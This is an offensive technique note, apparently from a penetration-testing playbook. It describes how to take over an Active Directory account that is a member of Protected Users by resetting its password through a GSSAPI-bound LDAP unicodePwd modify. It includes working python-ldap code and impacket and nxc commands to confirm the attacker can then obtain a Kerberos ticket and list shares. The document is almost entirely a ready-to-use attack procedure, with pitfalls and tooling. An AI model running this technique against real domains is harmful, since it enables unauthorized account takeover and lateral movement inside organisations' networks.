# Protected Users Group — Password Reset Bypass

## When this applies

- Target user is a member of `Protected Users` (enforces Kerberos-only auth — no NTLM, no delegation, no DES/RC4).
- You need to reset that user's password (e.g., via `ForceChangePassword` ACL or admin powers).
- SAMR-based reset (rpcclient/impacket) sets the NT hash but NOT the AES keys → Kerberos auth still fails.
- Goal: reset password via GSSAPI-authenticated LDAP `unicodePwd` modify, which generates ALL key types including AES256.

## Technique

`Protected Users` requires AES keys for Kerberos. SAMR-based password reset (`rpcclient setuserinfo2 23`, impacket `hSamrSetNTInternal1`) only sets the NT hash and leaves AES keys empty → next Kerberos auth attempt fails. Use GSSAPI-bound LDAP `unicodePwd` modify instead — AD generates all key types when the password is set this way.

## Steps

```bash
# Protected Users enforces Kerberos-only auth (no NTLM, no delegation, no DES/RC4)
# SAMR password reset (rpcclient/impacket) only sets NT hash — no AES keys generated
# Protected Users REQUIRES AES keys for Kerberos → SAMR reset alone = auth failure
# SOLUTION: Use GSSAPI-authenticated LDAP to modify unicodePwd attribute
#   This generates ALL key types including AES256
import ldap, ldap.sasl
l = ldap.initialize('ldap://DC')
l.set_option(ldap.OPT_X_SASL_NOCANON, 1)  # Critical: prevents SPN hostname canonicalization
l.sasl_interactive_bind_s('', ldap.sasl.gssapi(''))
encoded = ('"NewPass!"').encode('utf-16-le')
l.modify_s(target_dn, [(ldap.MOD_REPLACE, 'unicodePwd', [encoded])])
# Requires encrypted channel: GSSAPI LDAP (SASL sealing), LDAPS, or StartTLS
# NTLM-bound LDAP cannot modify unicodePwd (needs TLS/SASL encryption)
```

## Verifying success

- After password change, `impacket-getTGT 'domain/<protected_user>:NewPass!'` succeeds (returns TGT).
- `nxc smb DC -u <protected_user> -k --use-kcache --shares` works.

## Common pitfalls

- `OPT_X_SASL_NOCANON = 1` is critical — without it, the GSSAPI bind tries to canonicalize the SPN host and may fail.
- Encrypted channel required: GSSAPI LDAP (SASL sealing), LDAPS, or StartTLS. NTLM-bound LDAP cannot modify `unicodePwd`.
- The encoded password must be `"<password>"` (literal quotes) in UTF-16LE — exactly that format.

## Tools

- python-ldap (with GSSAPI/SASL)
- bloodyAD (also handles `unicodePwd` modify natively)
